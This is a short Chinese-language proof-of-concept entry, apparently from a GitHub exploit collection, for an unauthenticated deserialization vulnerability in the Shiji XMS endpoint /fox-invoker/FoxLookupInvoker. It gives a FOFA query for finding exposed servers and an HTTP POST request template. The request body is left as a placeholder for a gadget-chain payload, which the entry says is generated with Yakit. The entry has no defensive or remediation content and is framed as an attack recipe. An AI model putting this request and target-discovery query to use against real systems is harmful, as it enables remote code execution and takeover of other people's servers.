## 西软云XMS反序列化漏洞

西软云XMS /fox-invoker/FoxLookupInvoker接口处存在反序列化漏洞，未经身份认证的攻击者可利用此漏洞执行任意代码，获取服务器权限。

## fofa
```
app="shiji-西软云XMS"
```

## poc
```
POST /fox-invoker/FoxLookupInvoker/?return-exception=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
 
{{hexdec(cb18x的序列化链)}
```
使用yakit 生成payload
![c5fe271fed6a284b93b64e1023b2b581](https://github.com/wy876/POC/assets/139549762/2b6a22d6-7125-4f43-ae6a-253a92d83d23)

![e79d4907bddf12878c085d3146d856bc](https://github.com/wy876/POC/assets/139549762/799da585-0c34-431e-baa8-f939b19610a3)

